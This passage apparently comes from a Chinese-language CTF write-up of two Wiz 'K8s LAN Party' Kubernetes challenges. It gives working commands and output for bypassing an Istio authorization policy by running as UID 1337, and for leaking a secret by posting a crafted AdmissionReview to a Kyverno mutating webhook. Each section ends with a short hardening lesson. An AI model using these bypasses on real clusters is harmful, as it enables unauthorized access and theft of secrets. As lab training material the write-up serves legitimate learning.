<a href=#%e9%a2%98%e7%9b%ae-3 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&rsquo;t abuse this power; use it responsibly and with caution.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>security.istio.io/v1beta1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>AuthorizationPolicy</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>istio-get-flag</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>k8s-lan-party</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>action</span>: <span style=color:#ae81ff>DENY</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selector</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>matchLabels</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>app</span>: <span style=color:#e6db74>&#34;{flag-pod-name}&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>rules</span>:
</span></span><span style=display:flex><span>  - <span style=color:#f92672>from</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>namespaces</span>: [<span style=color:#e6db74>&#34;k8s-lan-party&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#f92672>to</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>operation</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>methods</span>: [<span style=color:#e6db74>&#34;POST&#34;</span>, <span style=color:#e6db74>&#34;GET&#34;</span>]
</span></span></code></pre></div><h3 id=解题-3 class=header-anchor-wrapper>解题
<a href=#%e8%a7%a3%e9%a2%98-3 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><ol><li>扫描</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># dnscan -subnet 10.100.0.1/16</span>
</span></span><span style=display:flex><span>10.100.224.159 -&gt; istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
</span></span></code></pre></div><ol start=2><li>尝试访问</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</span>
</span></span><span style=display:flex><span>RBAC: access denied
</span></span></code></pre></div><ol start=3><li>根据<a href=https://github.com/istio/istio/issues/4286>issues</a>以及<a href=https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf>Istio Security Assessment</a>，攻击者可以通过创建 UID 1337 的用户并以该用户身份运行，从而绕过 Envoy 对出站流量的监控。</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cat /etc/passwd |grep 1337</span>
</span></span><span style=display:flex><span>istio:x:1337:1337::/home/istio:/bin/sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># su istio</span>
</span></span><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>only-leet-hex0rs-can-play-both-k8s-and-linux<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-3 class=header-anchor-wrapper>思考
<a href=#%e6%80%9d%e8%80%83-3 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>容器内避免使用root用户运行。</p><h2 id=challenge-5-lateral-movement class=header-anchor-wrapper>Challenge 5: LATERAL MOVEMENT
<a href=#challenge-5-lateral-movement class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h2><h3 id=题目-4 class=header-anchor-wrapper>题目
<a href=#%e9%a2%98%e7%9b%ae-4 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a href=https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request>administrative</a> services.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>kyverno.io/v1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Policy</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>apply-flag-to-env</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>sensitive-ns</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>rules</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>inject-env-vars</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>match</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>resources</span>:
</span></span><span style=display:flex><span>          <span style=color:#f92672>kinds</span>:
</span></span><span style=display:flex><span>            - <span style=color:#ae81ff>Pod</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>mutate</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>patchStrategicMerge</span>:
</span></span><span style=display:flex><span>          <span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>            <span style=color:#f92672>containers</span>:
</span></span><span style=display:flex><span>              - <span style=color:#f92672>name</span>: <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>env</span>:
</span></span><span style=display:flex><span>                  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>FLAG</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>value</span>: <span style=color:#e6db74>&#34;{flag}&#34;</span>
</span></span></code></pre></div><h3 id=解题-4 class=header-anchor-wrapper>解题
<a href=#%e8%a7%a3%e9%a2%98-4 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><ol><li>扫描</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ dnscan -subnet 10.100.0.1/16
</span></span><span style=display:flex><span>10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.
</span></span></code></pre></div><ol start=2><li>根据[administrative](<a href=https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request%5D>https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request]</a>，进行AdmissionReview</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> --data <span style=color:#e6db74>&#39;{&#34;apiVersion&#34;:&#34;admission.k8s.io/v1&#34;,&#34;kind&#34;:&#34;AdmissionReview&#34;,&#34;request&#34;:{&#34;uid&#34;:&#34;12345678-1234-1234-1234-123456789012&#34;,&#34;kind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;resource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;requestKind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;requestResource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;namespace&#34;:&#34;sensitive-ns&#34;,&#34;operation&#34;:&#34;CREATE&#34;,&#34;object&#34;:{&#34;apiVersion&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;,&#34;metadata&#34;:{&#34;name&#34;:&#34;example-pod&#34;,&#34;namespace&#34;:&#34;sensitive-ns&#34;},&#34;spec&#34;:{&#34;containers&#34;:[{&#34;name&#34;:&#34;example-container&#34;,&#34;image&#34;:&#34;nginx&#34;,&#34;env&#34;:[{&#34;name&#34;:&#34;FLAG&#34;,&#34;value&#34;:&#34;{flag}&#34;}]}]}}}}&#39;</span> | jq -r .response.patch | base64 -d | jq -r <span style=color:#e6db74>&#39;.[0].value&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考-4 class=header-anchor-wrapper>思考
<a href=#%e6%80%9d%e8%80%83-4 class=header-anchor-link><svg width="16" height="16" viewBox="0 0 24 24"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg></svg></a></h3><p>避免在动态准入控制放置敏感信息。</p></article></div></div></main></body></html>